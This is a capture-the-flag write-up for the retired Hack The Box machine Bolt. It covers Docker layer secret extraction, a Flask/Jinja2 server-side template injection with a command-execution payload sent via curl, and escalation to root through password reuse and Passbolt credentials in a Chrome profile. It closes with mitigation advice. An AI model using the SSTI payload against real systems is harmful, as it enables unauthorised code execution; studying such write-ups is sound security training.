---
machine: Bolt
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, docker, ssti, passbolt, chrome]
---

# Bolt — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An application backup includes Docker image layers with code and secrets. That data enables a Flask SSTI; password reuse leads to a Chrome profile and Passbolt, whose recovery flow yields root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443 <IP>
# Extract image layers
mkdir layers && tar -xf backup.tar -C layers
find layers -name ".env" -o -name "*.py" | head
# SSTI
curl -s "http://bolt.htb/" --data-urlencode "name={{7*7}}"
curl -s "http://bolt.htb/" --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}"
# Passbolt
ls -la ~/.config/google-chrome/Default/
```

## Enumeration

- Flask site with a name field and a Jinja2 template.
- Backup with Docker image layers and application files.
- Chrome profile and Passbolt database on the host.

## Initial access

Extract the image layers and recover the source, `.env` and session key. The source reveals an SSTI in the name field; inject a Jinja2 expression and obtain a shell.

## Privilege escalation

Reuse the `.env` passwords over SSH. The Chrome profile stores Passbolt credentials; the database and PGP key allow the recovery flow and execution as root.

## Evidence

- Docker layers with `.env` and Flask code.
- `{{ 7*7 }}` render and `id` execution.
- Passbolt credentials and root shell.

## Lessons learned

- Docker images contain deleted layers and secrets.
- A Jinja2 template with user input is SSTI.
- Passbolt and browser profiles are high-value targets.

## Mitigation and detection

- Remove secrets from images and use `docker history`/`dive`.
- Do not render templates with user input.
- Rotate passwords and protect Passbolt profiles and databases.

## References

- [0xdf — Bolt](https://0xdf.gitlab.io/2022/02/19/htb-bolt.html)
- [Docker — Image layers](https://docs.docker.com/storage/storagedriver/)
- [Hack The Box — Bolt](https://app.hackthebox.com/machines/bolt)
